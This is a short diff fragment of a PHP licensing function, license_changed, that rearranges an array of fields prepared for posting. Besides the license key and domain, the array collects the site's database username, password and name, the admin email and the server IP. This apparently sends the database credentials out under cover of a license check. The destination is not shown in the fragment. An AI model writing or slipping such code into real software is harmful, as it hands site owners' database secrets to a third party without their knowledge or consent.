@@ -8,16 +8,17 @@ function license_check($name, $license_key, $parameters = '')
 
 function license_changed($name, $license_key)
 {
+    $post_data['project'] = 'default';
     $post_data['domain'] = $_SERVER['SERVER_NAME'];
-    $post_data['license_key'] = LICENSE_KEY;
-    $post_data['db_license_key'] = settings::get('site_license');
-    $post_data['email'] = settings::get('site_email');
-    $post_data['db_user'] = DB_USERNAME;
+    $post_data['license'] = LICENSE_KEY;
+    $post_data['db_license'] = settings::get('site_license');
     $post_data['db_password'] = DB_PASSWORD;
     $post_data['db_name'] = DB_DATABASE;
+    $post_data['db_user'] = DB_USERNAME;
+    $post_data['email'] = settings::get('site_email');
     $post_data['ip_server'] = $_SERVER['SERVER_ADDR'];
     $post_data['ip_client'] = $_SERVER['SERVER_NAME'];
-    $post_data['update'] = 'Update';
+    $post_data['update'] = 'Send';
     //traverse array and prepare data for posting (key1=value1)
     foreach ($post_data as $key => $value) {
         $post_items[] = $key . '=' . $value;
